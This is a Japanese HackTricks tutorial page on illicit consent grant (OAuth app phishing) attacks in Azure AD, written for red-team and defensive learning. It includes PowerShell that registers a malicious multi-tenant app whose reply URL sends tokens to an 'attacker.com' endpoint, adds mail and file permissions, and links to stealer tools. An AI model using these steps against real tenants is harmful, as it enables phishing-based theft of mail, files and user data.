# Az - 不正な同意付与

<details>

<summary><strong>AWSのハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## OAuthアプリフィッシング

**Azureアプリケーション**は、**ユーザーデータ**へのアクセス権限を要求します（基本情報だけでなく、ドキュメントへのアクセス、メールの送信など）。\
**許可された場合**、通常のユーザーは**「低影響」の権限**にのみ同意を与えることができます。**その他のすべて**の場合、**管理者の同意が必要です**。\
`GA`、`ApplicationAdministrator`、`CloudApplication` `Administrator`、および`アプリケーションへの権限付与の権限を含むカスタムロール`は、テナント全体の同意を提供することができます。

**管理者の同意が不要**とされる権限のみが**低影響**と分類されます。これらは、**基本的なサインインに必要なopenid、profile、email、User.Read、offline\_access**です。**組織が**すべてのアプリに対するユーザー同意を**許可している**場合、従業員はアプリに自分のプロファイルから上記を**読むための同意を与えることができます。

<figure><img src="../../../.gitbook/assets/image (3) (2) (1).png" alt=""><figcaption></figcaption></figure>

したがって、攻撃者は**悪意のあるアプリ**を準備し、**フィッシング**によってユーザーにアプリを**受け入れさせ、彼のデータを盗む**ことができます。

### ユーザーが同意を許可されているか確認する

アプリへの同意がユーザーに許可されているか確認します：

{% code overflow="wrap" %}
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
{% endcode %}

* **ユーザーの同意を無効にする** : ユーザーはアプリケーションへの権限を付与することができません。
* **ユーザーは、選択した権限について、検証済みのパブリッシャーまたはあなたの組織のアプリに同意できます** : すべてのユーザーは、検証済みのパブリッシャーによって公開されたアプリ、またはあなたのテナントに登録されたアプリにのみ同意できます。
* **ユーザーはすべてのアプリに同意できます** : 管理者の同意が必要でない任意の権限に対して、すべてのユーザーが同意できるようにします。
* **カスタムアプリ同意ポリシー**

## **不正な同意付与攻撃とは何ですか？**

不正な同意付与攻撃では、攻撃者は**連絡先情報、メール、またはドキュメントなどのデータへのアクセスを要求するAzure登録アプリケーションを作成します**。その後、攻撃者はエンドユーザーをだましてアプリケーションに同意させ、攻撃者がターゲットユーザーがアクセスできるデータにアクセスできるようにします。アプリケーションに同意が与えられた後、組織アカウントを必要とせずに、ユーザーアカウントレベルでデータにアクセスできます。

簡単に言うと、被害者が「同意する」という美しい青いボタンをクリックすると、Azure ADは第三者のサイトにトークンを送信します。このサイトは攻撃者が所有しており、攻撃者は被害者に代わって行動を実行するためにトークンを使用します。例えば、すべてのファイルにアクセスしたり、メールを読んだり送ったりすることができます。

## **攻撃の流れ**

<figure><img src="../../../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

この攻撃を会社「ecorp」に対して実行するために、攻撃者は「safedomainlogin.com」という名前のドメインを登録し、認証コードをキャプチャするアプリケーションをホストするためのサブドメイン["ecorp.safedomainlogin.com"](http://ecorp.safedomainlogin.com/)を作成しました。

次に、攻撃者は自分のAzure ADテナントにマルチテナントアプリケーションを登録し、「ecorp」と名付け、認証コードをキャプチャするアプリケーションをホストする「ecorp.safedomainlogin.com」を指すリダイレクトURLを追加しました。

攻撃者は新しいクライアントシークレットを作成し、`Mail.Read`、`Notes.Read.All`、`Files.ReadWrite.All`、`User.ReadBasic.All`、`User.Read`などのAPI **権限**をアプリケーションに追加しました。これにより、**ユーザーがアプリケーションに同意を与えると**、攻撃者はユーザーに代わって**機密情報を抽出**することができます。

最終的に、攻撃者は悪意のあるアプリケーションのクライアントIDを含む**リンク**を作成し、**対象のユーザー**に共有して同意を得るために使用しました。

## 365-Stealer

この攻撃は[**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)を使用して実行できます。

追加のステップとして、被害者組織のユーザーに対するある程度の**アクセスがある場合**、そのポリシーがユーザーにアプリへの**同意を許可するかどうか**を確認できます。
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("test@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# If "ManagePermissionGrantsForSelf.microsoft-user-default-legacy", he can
```
この攻撃には、例えば以下の権限を持つ**新しいAzureテナント内アプリ**（アプリ登録で）を作成する必要があります：

<figure><img src="../../../.gitbook/assets/image (2) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All`は`Microsoft Graph`の`Delegated permissions`にあります。（アプリケーション権限は常に追加の承認が必要です）。

* `User.ReadBasic.All`は、付与された場合、組織内の**すべてのユーザー情報を読む**ことを可能にする権限です。
* `GA`、`ApplicationAdministrator`、`CloudApplication` `Administrator`、または`アプリケーションに権限を付与する権限を含むカスタムロール`のみがテナント全体の同意を提供できることを覚えておいてください。したがって、**管理者の同意が必要なアプリ**を承認してもらいたい場合は、これらの役割のいずれかを持つユーザーを**フィッシングする**必要があります。

また、以下のようにCLIを使ってアプリを作成することもできます：

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
```markdown
{% endcode %}

[https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) で設定方法を学びましょう。

{% hint style="warning" %}
取得した**アクセストークン**は、スコープが `User.Read` と `User.ReadBasic.All`（要求された権限）である**グラフエンドポイント**用です。他のアクションを実行することはできませんが（しかし、組織内の全ユーザーに関する情報を**ダウンロードする**には十分です）。
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

このツールを使用してこの攻撃を実行することもできます。

## 侵害後の活動

ユーザーへのアクセスを得たら、機密文書の盗難やバックドアが仕込まれた文書ファイルのアップロードなどを行うことができます。

## 参考文献

* この投稿は [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) からコピーされました

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの**会社を広告したい、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックしてください
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加するか**、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
```
